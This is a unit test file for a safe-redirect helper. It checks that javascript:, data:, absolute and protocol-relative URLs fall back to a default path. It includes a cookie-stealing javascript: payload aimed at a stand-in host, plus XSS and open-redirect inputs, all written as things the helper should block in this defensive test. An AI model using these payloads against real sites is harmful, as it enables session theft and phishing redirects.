// Copyright (c) 2026 Pablo Health, LLC. Licensed under AGPL-3.0.

import { describe, it, expect } from "vitest"
import { safeRedirectPath } from "../safeRedirect"

describe("safeRedirectPath", () => {
  it("allows a same-origin path", () => {
    expect(safeRedirectPath("/dashboard", "/login")).toBe("/dashboard")
    expect(safeRedirectPath("/sessions?id=1", "/login")).toBe("/sessions?id=1")
  })

  it("blocks javascript: URLs (XSS via href click)", () => {
    expect(safeRedirectPath("javascript:alert(1)", "/login")).toBe("/login")
    expect(safeRedirectPath("javascript:fetch('//atk/'+document.cookie)", "/login")).toBe(
      "/login"
    )
  })

  it("blocks data: URLs", () => {
    expect(safeRedirectPath("data:text/html,<script>alert(1)</script>", "/login")).toBe(
      "/login"
    )
  })

  it("blocks absolute http(s) URLs (open redirect)", () => {
    expect(safeRedirectPath("https://evil.example/", "/login")).toBe("/login")
    expect(safeRedirectPath("http://evil.example/", "/login")).toBe("/login")
  })

  it("blocks protocol-relative URLs", () => {
    expect(safeRedirectPath("//evil.example/path", "/login")).toBe("/login")
    expect(safeRedirectPath("///evil.example", "/login")).toBe("/login")
  })

  it("falls back when input is null, undefined, or empty", () => {
    expect(safeRedirectPath(null, "/login")).toBe("/login")
    expect(safeRedirectPath(undefined, "/login")).toBe("/login")
    expect(safeRedirectPath("", "/login")).toBe("/login")
  })

  it("blocks paths that don't start with a slash", () => {
    expect(safeRedirectPath("dashboard", "/login")).toBe("/login")
    expect(safeRedirectPath("evil.example/path", "/login")).toBe("/login")
  })
})
